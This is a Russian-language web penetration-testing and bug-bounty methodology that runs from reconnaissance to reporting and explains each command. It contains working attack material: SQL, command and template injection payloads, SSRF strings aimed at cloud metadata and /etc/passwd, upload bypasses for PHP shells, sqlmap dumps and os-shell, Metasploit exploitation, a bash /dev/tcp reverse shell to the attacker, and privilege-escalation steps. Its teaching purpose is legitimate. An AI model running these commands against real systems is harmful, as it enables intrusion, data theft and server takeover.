8 фаз · от пассивной разведки до отчёта · с объяснением каждого шага

Фаза 0 · Подготовка

Прежде чем идти в разведку — убедись, что инструменты стоят и данные не потеряются.

0.1 Проверка инструментов

Нет смысла строить конвейер на программах, которых нет в системе.

which nmap nikto gobuster ffuf nuclei sqlmap whatweb wafw00f hydra \
      subfinder httpx katana gau waybackurls arjun dalfox burpsuite

sudo apt install -y nmap nikto gobuster ffuf sqlmap whatweb wafw00f hydra
Что это значит (объяснение)

which — «где лежит программа». Пустой вывод = программа не установлена.

Часть инструментов ставится через go install (ProjectDiscovery: subfinder, httpx, katana, nuclei). Если их нет — ставь po отдельности:

  • go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
  • pip install arjun — скрытые параметры

Правило: если инструмент не читаешь и не понимаешь — не ставь. «Синдром коллекционера тулзов» — одна из главных ловушек новичков: 50 программ в системе и ни одной прочитанной находки.

Фаза 1 · Пассивная разведка

Не касаемся цели вообще — спрашиваем про неё у чужих баз данных. Тише, безопаснее, а находок часто больше.

1.1 Субдомены

Один забытый dev-поддомен может стоить дороже, чем весь основной сайт.

subfinder -d TARGET -all -recursive -silent -o subs.txt
assetfinder --subs-only TARGET | anew subs.txt
curl -s "https://crt.sh/?q=%25.TARGET&output=json" | jq -r '.[].name_value' | sort -u >> subs.txt
amass enum -passive -d TARGET -o subs_amass.txt
cat subs*.txt | sort -u > subs_all.txt
Что это значит (объяснение)

Субдомены — это dev.сайт, api.сайт, admin.сайт. Они не всегда видны на главной странице.

  • -d — домен · -all — все источники данных · -recursive — искать субдомены субдоменов
  • -silent — только результат, без баннеров
  • crt.sh — база выданных TLS-сертификатов. Каждый сертификат публичен, и там виден список доменов (SAN)
  • anew — дописывает в файл только строки, которых там ещё нет
  • amass -passive — тяжёлый, зато перебирает десятки баз

Что искать в списке: имена со словами dev, staging, test, old, beta, internal, admin, api, vpn.

1.2 Что из этого живо

Из 2000 субдоменов реально работают 100. Работать будем только с живыми.

httpx -l subs_all.txt -silent -status-code -title -tech-detect \
      -follow-redirects -threads 100 -o live.txt
Что это значит (объяснение)
  • -status-code — HTTP-код ответа
  • -title — заголовок страницы (по нему видно «Login», «Admin», «phpMyAdmin»)
  • -tech-detect — определяет технологии (nginx, PHP, WordPress, Spring…)
  • -threads 100 — сколько хостов проверять одновременно

Что искать: в live.txt — строки с login, admin, swagger, api, jenkins, grafana, а также нестандартные стеки.

Важно: не смотри на 10 000 строк. Выбери 5 самых интересных — это и есть «modern recon».

1.3 Исторические URL (архивы интернета)

Сайт мог иметь страницы, которые давно удалили. Архивы их помнят — и там часто остаются скрытые эндпоинты.

echo TARGET | waybackurls | anew urls.txt
cat live.txt | awk '{print $1}' | gau | anew urls.txt
katana -list live.txt -d 3 -jc -silent -o urls_katana.txt
cat urls_katana.txt | anew urls.txt
grep -vE '\.(png|jpg|jpeg|gif|css|woff|svg|ico|ttf)$' urls.txt | sort -u > urls_clean.txt
Что это значит (объяснение)
  • waybackurls / gau — вытаскивают URL из archive.org, Common Crawl, AlienVault, URLScan. Никакого касания цели
  • katana — активный краулер: ходит по сайту как браузер. -jc — разбирать JavaScript, -d 3 — глубина 3 клика
  • grep -vE — выбросить картинки и стили, оставить только страницы и API

Что искать: ?id=, ?token=, /api/v1/, .json, .php? — любой параметр в историческом URL = потенциальная точка входа.

1.4 JavaScript — главный клад

Современные приложения выкладывают всю логику в JS-файлы. Там видны API-эндпоинты, которых нет в меню, и иногда ключи.

grep -E '\.js(\?|$)' urls_clean.txt | sort -u > js.txt
mkdir -p js && cd js
cat ../js.txt | xargs -P 20 -I{} wget -q {}

# эндпоинты внутри JS
for f in *.js; do python3 LinkFinder.py -i "$f" -o cli; done | sort -u > endpoints.txt

# секреты
for f in *.js; do python3 SecretFinder.py -i "$f" -o cli; done
trufflehog filesystem ./js
Что это значит (объяснение)
  • LinkFinder — ищет внутри JS строки, похожие на пути: /api/users/list
  • SecretFinder — ищет ключи: AWS (AKIA…), Google (AIza…), Stripe (sk_live_…), Firebase, SendGrid
  • trufflehog — проверяет найденные ключи на «живость», отсекая фальшивки

Что искать ещё: enabled, beta, experimental, feature_flag — выключенные фичи, к которым нет кнопки, но есть API.

Найденный ключ — это не баг. Проверь, что он реально даёт доступ. Публичный ключ Stripe (pk_live_) — норма, секретный (sk_live_) — критично.

1.5 Скрытые параметры

У эндпоинта могут быть параметры, которых нет ни в форме, ни в ссылке. Они часто и есть незащищённый вход.

arjun -u "https://TARGET/api/user" -m GET,POST --stable -o params.json
Что это значит (объяснение)

arjun отправляет много запросов с разными именами параметров и смотрит, меняется ли ответ. Если меняется — параметр существует.

  • -m GET,POST — проверять и в адресе, и в теле
  • --stable — меньше ложных срабатываний

Альтернативы: x8 (быстрее, на Rust), ParamSpider (берёт имена параметров из архивов).

Что делать с найденным: прогони каждый параметр через Шаг 4 (XSS/инъекции) и Шаг IDOR — скрытые параметры почти всегда без проверок.

Фаза 2 · Активная разведка

Теперь стучимся в цель. Здесь важно не «спалить» себя и не уронить сайт.

2.1 Порты и сервисы

На сервере могут быть открыты двери помимо 80/443 — и за ними админки, базы, внутренние тулзы.

nmap -sV -sC -T4 --top-ports 1000 TARGET -oN nmap.txt

# если разрешено и нужно всё:
nmap -sV -sC -T4 -p- TARGET -oN nmap_full.txt
Что это значит (объяснение)
  • -sV — версии программ на портах
  • -sC — стандартные проверочные скрипты
  • -T — скорость: 0 paranoid, 2 polite, 3 normal, 4 aggressive, 5 insane
  • --top-ports 1000 — 1000 популярных портов · -p- — все 65535

Особое внимание портам: 3000, 4000, 5000, 7000, 8000, 8080, 8081, 8443, 8888, 9000, 9090, 9200, 15672 — там живут внутренние панели (Grafana, Jenkins, Kibana, RabbitMQ, Spring).

-T4 на живом боевом сайте может привлечь внимание — если есть WAF, снизь до -T2.

2.2 Защита WAF

Результат задаёт «громкость» всех дальнейших сканов.

wafw00f -a https://TARGET
Что это значит (объяснение)

-a — проверить все известные подписи WAF (Cloudflare, Akamai, Imperva, Sucuri, F5…).

Режимы:

  • WAF есть → тихо: -T2, -t 10, -c 25, -rl 50, sqlmap --level 2 --risk 1, и добавляй --tamper в sqlmap
  • WAF нет → можно -T4, -t 50, -c 100

Обход 403/WAF блокировок: смена User-Agent, X-Forwarded-For: 127.0.0.1, X-Original-URL, задержки между запросами, кодирование payload.

2.3 Технологии сайта

Стек говорит, какие именно баги искать: Spring → actuator, Next.js → SSRF, старый jQuery → prototype pollution.

whatweb -a 3 https://TARGET
httpx -u https://TARGET -tech-detect -title -web-server
Что это значит (объяснение)

-a (aggressiveness): 1 stealthy (один запрос), 2 polite, 3 aggressive (точно, заметно), 4 heavy.

Развилки по стеку:

ВидишьЧто проверять
WordPresswpscan --enumerate ap,at,u → CVE плагинов
Joomlajoomscan → компоненты, /administrator/
Drupaldroopescan → версии модулей
Spring Boot/actuator/env, /actuator/heapdump, /actuator/gateway
Next.jsSSRF в image optimizer, /_next/data/
React/Vue SPAкаталоги не работают → сразу JS-анализ и Burp
Swagger/swagger.json, /api-docs → полная карта API

2.4 Виртуальные хосты

На одном IP может жить 20 сайтов, но в DNS виден один. Остальные находятся подстановкой заголовка Host.

ffuf -u https://TARGET -H "Host: FUZZ.TARGET" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -fs 1234 -t 50
Что это значит (объяснение)
  • -H "Host: FUZZ.TARGET" — подставляем разные имена в заголовок Host, сервер отвечает разными сайтами
  • -fs 1234 — size filter: выбросить ответы с размером «страницы по умолчанию» (сначала запусти без него и посмотри, какой размер у заглушки)
  • -t 50 — потоков

Зачем: внутренние стенды (staging, jira, internal) часто не имеют DNS-записи, но отвечают на Host.

2.5 Check-list слабых мест

Быстрый автоматический обход на забытые файлы и настройки.

nikto -h https://TARGET -Tuning 12389 -o nikto.txt
Что это значит (объяснение)

-Tuning: 1 интересные файлы · 2 ошибки конфигурации · 3 утечка инфо · 4 инъекции · 8 выполнение команд · 9 SQLi · 6 DoS (на живом не включать).

Что смотреть: строки с +. Ценно: /admin, backup.zip, .env, phpinfo.php, /server-status, .git/config.

0 item(s) reported — чисто, идём дальше.

2.6 Скрытые пути

Страницы без ссылок в меню: /api, /backup, /test, /internal.

ffuf -u https://TARGET/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
    -mc 200,204,301,302,307,401,403 -t 50 -o fuzz.txt

# с расширениями:
ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
    -e .php,.html,.bak,.zip,.json,.txt -mc 200,301,403
Что это значит (объяснение)
  • FUZZ — место подстановки слова из словаря
  • -mc (match codes) — какие коды считать находкой: 200 есть, 301/302 есть (редирект), 401/403 есть, но закрыто
  • -e — дописывать расширения
  • -fs / -fw / -fl — фильтр по размеру ответа / числу слов / строк (убирает «страницу-заглушку»)
  • -ac — auto-calibrate: ffuf сам определяет размер заглушки и фильтрует

Целевой фаззинг вместо слепого: сначала определи стек (Шаг 2.3), потом бери словарь под него. Не валить 5-миллионный словарь в корень сайта.

Методы: проверь не только GET. Некоторые эндпоинты принимают PUT/DELETE без авторизации:

for m in GET POST PUT DELETE PATCH OPTIONS; do
  curl -X $m -s -o /dev/null -w "$m: %{http_code}\n" https://TARGET/api/users/1
done

2.7 Шаблоны известных уязвимостей

Тысячи готовых проверок конкретных CVE и ошибок настройки за один прогон.

nuclei -update-templates
nuclei -u https://TARGET -severity low,medium,high,critical -c 50 -rl 100 -o nuclei.txt

# по списку живых хостов:
nuclei -l live.txt -severity medium,high,critical -c 50 -o nuclei_all.txt

# под конкретный стек / тип:
nuclei -u https://TARGET -tags apache,nginx,exposures,misconfig,cve -severity medium,high,critical
nuclei -u https://TARGET -t cves/ -tags rce
Что это значит (объяснение)
  • -severity — info → low → medium → high → critical
  • -tags — только шаблоны с этими метками
  • -c — шаблонов параллельно (25 тихо, 100 быстро)
  • -rl — запросов в секунду
  • -t — конкретная папка шаблонов (cves/, exposures/, misconfigurations/)
«Spray and pray» — прогнать одни и те же шаблоны по тысячам хостов. Современный WAF видит это как фоновый шум. Лучше: точные теги под стек + ручная проверка найденного.

Куда дальше: нашёл [critical] [cve] → Фаза 5 (Metasploit). Нашёл misconfig → открой URL в браузере. Пусто → Фаза 3.

Фаза 3 · Карта приложения (руками)

Здесь начинается то, что автоматика не умеет. По оценкам практиков — самый результативный этап.

3.1 Burp: карта + роли

Сканер ищет «известные» баги. А баги доступа — «кто чьими данными владеет» — находит только человек с двумя аккаунтами.

burpsuite    # браузер → прокси 127.0.0.1:8080, установить CA-сертификат Burp
Что это значит (объяснение)

Порядок работы (ритуал, а не «нажать Scan»):

  • 1. Зарегистрируй аккаунты на всех доступных ролях: гость, обычный юзер, модератор, админ
  • 2. Пройди ВЕСЬ сайт через прокси: каждая страница, каждая форма, каждый AJAX-запрос
  • 3. Открой Target → Site map — это и есть карта поверхности атаки
  • 4. Выпиши все места, где встречаются ID, роль, статус, цена, счётчик — это кандидаты на логические баги
  • 5. Скопируй сайтмап в заметки: эндпоинт → метод → параметры → какая роль

Ключевая мысль: 80% поверхности — это залогиненная часть. Тестировать только главную страницу — тестировать почти ничего.

Отключи «сканер» в голове и включи «пользователя»: что эта кнопка должна делать? Что будет, если я нажму её дважды? Если поменяю порядок? Если отправлю без предыдущего шага?

Фаза 4 · Ручное тестирование по классам

По одному классу уязвимости за раз, по каждому входу. Не останавливайся на первой находке.

4.1 IDOR / доступ к чужим данным

Класс №1 по выплатам. Сервер отдаёт объект по ID, не проверяя, твой ли он.

# ритуал:
# 1) аккаунт A создаёт объект (заказ, тикет, профиль)
# 2) берём запрос в Burp Repeater
# 3) подставляем сессию аккаунта B + ID объекта A
# ожидаем 403/404, баг = 200 + данные A
Что это значит (объяснение)

Где искать ID:

  • в пути: /api/users/123, /orders/456
  • в query: ?user_id=123, ?invoice=456
  • в теле: {"invoice_id": 123}
  • в заголовках: X-User-Id, X-Tenant
  • в GraphQL-переменных

Варианты: UUID — тоже не защита, если он «утекает» в другом ответе. Путь /users/me → /users/../admin.

Вертикальный доступ: обычным юзером открыть админский эндпоинт. Обходы 403:

/admin  →  /admin/  →  /Admin  →  /admin;/  →  /admin%20
GET запрещён → POST разрешён
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1

Почему сканер не найдёт: для этого нужны два аккаунта и понимание, «чей» объект. Сканер работает в одной сессии.

4.2 Аутентификация и сессии

Слабый сброс пароля или вечная сессия = захват аккаунта без всяких инъекций.

# чек-лист руками в Burp Repeater
# 1. сброс пароля: токен одноразовый? истекает? привязан к юзеру?
# 2. logout — сессия реально умирает? (повтори старый запрос)
# 3. смена пароля — старые сессии живы?
# 4. rate limit на логине есть? (отправь 50 попыток)
# 5. перечисление юзеров: "нет такого" vs "неверный пароль"
Что это значит (объяснение)

JWT-проверки:

  • alg: none — попробуй подписать токен без подписи
  • подмени claim {"role":"user"} → {"role":"admin"} и подпиши известным секретом (частые: secret, your-256-bit-secret)
  • kid-инъекция, пустой ключ (alg: HS256 с публичным ключом RSA)
  • Инструмент: jwt_tool — python3 jwt_tool.py TOKEN -T (все атаки автоматически)

MFA: подмени ответ «code_required: true» → false; отправь пустой код; переиспользуй код; брут 4-значный код без rate limit.

OAuth: отсутствие state = CSRF на вход. redirect_uri без проверки = утечка токена (часто в цепочке с open redirect).

4.3 Бизнес-логика

По оценкам практиков, 73% успешных хантеров ставят этот класс выше технических багов.

# проверяй сценарии, а не параметры:
# купон применить дважды / к чужой корзине / после истечения
# отрицательное количество: qty=-1
# цена в запросе: price=100 → price=1
# пропустить шаг оформления (перейти сразу к /pay)
# отменить чужой заказ; вернуть товар дважды
Что это значит (объяснение)

Бизнес-логика — это «сайт делает не то, что задумал создатель». Никакой payload тут не нужен, нужен вопрос: «а что если…»

  • Что если отправить шаг 3, не выполнив шаг 2?
  • Что если число будет отрицательным / нулём / очень большим?
  • Что если повторить действие 100 раз параллельно?
  • Что если подставить чужой ID в шаг, где его обычно не меняют?
  • Что если покупатель — сам себе продавец?

Именно тут «чистый отчёт сканера» и реальная уязвимость расходятся сильнее всего.

4.4 Инъекции: SQL / команды / шаблоны

Проверяй каждый параметр, дошедший до сервера или базы.

# признак SQLi: одиночная кавычка → 500 / ошибка SQL
?id=1'
?id=1 AND 1=1      → тот же ответ
?id=1 AND 1=2      → другой ответ     = boolean-based
?id=1'||(SELECT SLEEP(5))||'          = time-based

# инъекция команд:
?ip=127.0.0.1;id
?host=127.0.0.1|whoami
?name=$(id)

# SSTI (движок шаблонов):
{{7*7}}      → 49 ?
${7*7}       → 49 ?
<%= 7*7 %>   → 49 ?
Что это значит (объяснение)
  • SQLi: кавычка ломает запрос → ошибка БД = есть контакт. Дальше — Фаза 5 (sqlmap)
  • Command injection: разделители ; | && `` $( ) %0a. Ищи функции, которые «что-то запускают»: ping, конвертация картинок, резервное копирование, DNS-lookup
  • SSTI: {{7*7}} вернуло 49 — значит сервер рендерит твой ввод как шаблон. Дальше — payload под движок (Jinja2, Twig, Freemarker) → RCE
  • NoSQL: {"user":"admin","pass":{"$ne":null}} — обход логина

Инструмент: commix для командных инъекций, sqlmap для SQL (Фаза 5).

4.5 XSS

Отражение в ответе ≠ выполнение. Подтверждай в браузере и в реальном контексте.

">



dalfox url "https://TARGET/search?q=test" --deep-domxss
Что это значит (объяснение)

Три типа:

  • Reflected — payload в ответе сразу, живёт одну ссылку
  • Stored — payload сохраняется и показывается другим (комментарий, имя профиля, заявка в поддержку). Самый ценный, потому что может сработать у админа
  • DOM — JS берёт из адреса # или параметра и кладёт в innerHTML. Сервер вообще не участвует

Как искать DOM-sink: DevTools → Sources → Event Listener Breakpoints → DOM mutation. Ходи по сайту, при срабатывании смотри стек вызовов: твой ввод попадает в innerHTML, document.write, eval, location.href?

Blind XSS: вставь payload с внешним сборщиком (например собственный вебхук) в поля поддержки/фидбека — если сработает в админке, получишь уведомление.

Найден XSS — не спеши отчитываться. Покажи реальный импакт: кража cookie сессии, CSRF-токена, действие от лица пользователя.

4.6 SSRF и перенаправления

Сервер по твоей просьбе сходит по адресу — и может зайти туда, куда тебе нельзя.

# ищи параметры: url, uri, path, src, dest, redirect, callback, webhook, next, return
?url=http://169.254.169.254/latest/meta-data/
?url=file:///etc/passwd
?url=http://127.0.0.1:6379/
?next=https://evil.tld
?next=//evil.tld
?next=https://TARGET@evil.tld
Что это значит (объяснение)
  • 169.254.169.254 — внутренний адрес метаданных облака (AWS/GCP). Там бывают ключи доступа
  • 127.0.0.1:порт — доступ к внутренним сервисам, закрытым снаружи
  • file:// — чтение локальных файлов
  • Фичи с SSRF: предпросмотр ссылки, импорт по URL, экспорт в PDF, обработка изображений из URL, RSS

Open redirect сам по себе «низкий», но в цепочке с OAuth = кража токена = захват аккаунта (см. раздел «Цепочки»).

Как подтвердить: направь на свой сервер/Burp Collaborator и убедись, что запрос пришёл с IP цели.

4.7 Загрузка файлов

Правильно обойдённый фильтр = выполнение кода на сервере.

shell.php
shell.pHp
shell.php.jpg
shell.php%00.jpg
shell.phtml
shell.phar

# Content-Type: image/png при PHP-содержимом
# магические байты: добавить в начало файла  \x89PNG\r\n\x1a\n
# содержимое:
Что это значит (объяснение)
  1. Расширение — сервер может блокировать только .php, но пускать .phtml, .phar, .php5
  2. Двойное расширение — shell.jpg.php
  3. Content-Type — подмена заголовка при реальном PHP-содержимом
  4. Магические байты — файл начинается как картинка, но содержит PHP
  5. Регистр/Unicode — shell.pHp

После загрузки: найди, куда файл лёг (смотри ответ сервера), и открой напрямую. Если выполняется — ?cmd=whoami = RCE.

Побочные импакты: SVG с XSS, DOCX с XXE, ZIP-архив с path traversal (zip slip).

4.8 Гонки (race conditions)

Сервер проверяет «уже использовано?» и только потом записывает. Отправь 50 запросов одновременно — и он не заметит.

# Burp → Repeater → выбрать запрос → Send group in parallel
# инструменты:
# turbo-intruder (расширение Burp), race-the-web
# single-packet attack доступен в новых версиях Burp
Что это значит (объяснение)

Классика:

  • купон применяется 2+ раза
  • вывод средств больше баланса
  • обход лимита попыток входа
  • дважды вернуть товар
  • TOCTOU: «проверил — потом использовал» разнесено во времени

Как: Burp → Repeater → выделить несколько одинаковых запросов → правый клик → Send group in parallel (single-packet) — они уйдут фактически в один момент.

Признак, что тут есть гонка: логика «сначала проверить, потом изменить» и никаких блокировок/транзакций на стороне сервера.

4.9 GraphQL и CORS

Современные API ломаются не payload-ами, а отсутствием проверок на уровне полей и доверием к Origin.

# GraphQL: интроспекция
curl -s https://TARGET/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name}}}"}'

# CORS: проверь отражение Origin
curl -s -I https://TARGET/api/me -H "Origin: https://evil.tld" | grep -i access-control
Что это значит (объяснение)

GraphQL-проверки:

  • интроспекция открыта в проде → вся схема видна
  • field-level auth: одно поле защищено, соседнее — нет
  • алиасы/батчинг для обхода rate limit
  • глубина запроса → DoS

CORS-баги:

  • сервер отражает любой Origin + Access-Control-Allow-Credentials: true → любой сайт может читать данные жертвы
  • Origin: null разрешён
  • доверие к префиксу: разрешён *.TARGET, а там есть поддомен, который можно захватить

Фаза 5 · Эксплуатация

Подтверждаем, что находка реально опасна. Не «похоже на баг», а воспроизводимый PoC.

5.1 sqlmap — по сохранённому запросу

Профессиональный порядок: точку входа ищешь руками в Burp, а массовый перебор техник отдаёшь sqlmap.

# 1) в Burp: правый клик по запросу → Copy to file → req.txt
# 2) затем:
sqlmap -r req.txt --batch --level 3 --risk 1 --dbs -o sqlmap.txt

# если есть WAF:
sqlmap -r req.txt --batch --level 5 --risk 2 --tamper=space2comment,randomcase

# выгрузка
sqlmap -r req.txt --batch -D БАЗА -T users --dump
sqlmap -r req.txt --batch --os-shell
Что это значит (объяснение)
  • -r — файл с полным HTTP-запросом (работает и для POST, и с cookie авторизации — это ключевое преимущество)
  • --batch — не спрашивать, отвечать по умолчанию
  • --level 1-5 — сколько техник пробовать (5 = долго, но thorough)
  • --risk 1-3 — рискованность (3 может изменить данные)
  • --tamper — скрипты обхода WAF (меняют вид payload: комментарии вместо пробелов, случайный регистр)
  • --os-shell — командная строка на сервере (если права позволяют)

Что смотреть: is injectable → инъекция есть. Дальше — дамп, затем --os-shell → Фаза 6.

5.2 Metasploit — по найденному CVE

Nuclei сказал «здесь CVE-XXXX». Metasploit даёт готовый эксплойт под него.

msfconsole -q
msf6> search CVE-XXXX-XXXX
msf6> use exploit/ПУТЬ_ИЗ_ПОИСКА
msf6> set RHOSTS IP_ЦЕЛИ
msf6> set RPORT 443
msf6> set SSL true
msf6> set TARGETURI /
msf6> set LHOST ТВОЙ_IP
msf6> set LPORT 4444
msf6> run
Что это значит (объяснение)
  • RHOSTS — чужой адрес (цель) · RPORT — порт (80 без SSL, 443 с SSL) · SSL — https
  • TARGETURI — путь, где живёт уязвимость
  • LHOST — твой адрес (узнать: ip a) · LPORT — порт, куда придёт соединение

После run при успехе появляется meterpreter > → команда shell → системная оболочка.

Развилки по типу находки:

Nuclei показалМодуль Metasploit
[rce] [cve]exploit/multi/http/... под конкретный CVE
[sqli]auxiliary/scanner/http/..._sqli или sqlmap
[lfi] / traversalexploit/multi/http/... + ручная проверка ?file=../../../../etc/passwd
[misconfig] логин-панельauxiliary/scanner/http/..._bruteforce_login или hydra

Если модуля нет: searchsploit сервис версия → берёшь публичный PoC (python/sh) и запускаешь вручную.

Фаза 6 · После получения доступа

Доступ — это не конец. Нужно понять, что можно с него сделать, и закрепиться (в рамках согласованного).

6.1 Обратный шелл

Сервер сам подключается к тебе — так обходят запрет на входящие соединения.

# у себя: ждём
nc -lvnp 4444

# на сервере (через --os-shell, RCE, редактор шаблона):
bash -i >& /dev/tcp/ТВОЙ_IP/4444 0>&1

# стабильный TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
Что это значит (объяснение)
  • nc -lvnp: listen — слушать, verbose — подробно, no-DNS — не резолвить, port — номер
  • /dev/tcp — встроенный в bash способ открыть TCP-соединение, сторонние программы не нужны
  • >& — перенаправить вывод и ошибки в соединение, 0>&1 — ввод тоже

Признак успеха: приглашение вида www-data@host:~$.

Альтернативы, если bash нет: python3 -c 'import socket,subprocess,os;...', php -r '$sock=fsockopen(...)', nc -e /bin/bash.

6.2 Что дальше на сервере

Зафиксировать факт доступа, показать импакт, найти путь к root — в рамках согласованных правил.

whoami; id; hostname; uname -a
cat /etc/passwd
sudo -l
find / -perm -4000 -type f 2>/dev/null
ls -la /var/www; cat /var/www/html/.env 2>/dev/null
./linpeas.sh -a
Что это значит (объяснение)
  • id — в каких группах ты (docker, sudo, adm — это пути к root)
  • sudo -l — какие команды разрешены от root. Самое важное: если есть NOPASSWD на vim/find/bash — root за секунду
  • find -perm -4000 — SUID-бинарники: смотри на gtfobins.github.io, есть ли эксплойт
  • linpeas — скрипт, который сам перебирает сотни способов эскалации

Пример: sudo -l показал (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c '!sh' → root.

Не выгружай реальные пользовательские данные больше, чем нужно для PoC. Для отчёта хватает 3-5 строк из таблицы, а не всей базы.

Фаза 7 · Отчёт

Отчёт — это продукт теста. Плохой отчёт превращает критический баг в «informative».

7.1 Структура отчёта (impact-first)

Сначала — что получит атакующий. Потом — как это воспроизвести.

1. Заголовок: [Критично] Любой пользователь может отменить чужой заказ
2. Impact: атакующий без прав получает контроль над заказами всех клиентов
3. Шаги воспроизведения (нумерованные, точные, с ролями)
4. PoC: запрос + ответ + скриншот/видео
5. Причина: отсутствие проверки владельца на /api/orders/{id}
6. Фикс: серверная проверка owner_id == session.user_id
7. Оценка: CVSS / критичность
Что это значит (объяснение)

Правило из практики: клиент не будет исправлять XSS, если ты напишешь «параметр отражается». Покажи payload, который крадёт cookie админа, со скриншотом.

  • Impact-first — первая строка про последствия, а не про технику
  • Воспроизводимость — любой инженер должен повторить по шагам без вопросов
  • Скриншоты по ходу — сохраняй сразу, потом не восстановишь
  • Мера — не преувеличивай: неверная оценка ломает доверие

Инструменты: Dradis, Pwndoc, Faraday, Obsidian/Notion — шаблоны отчётов и учёт находок.
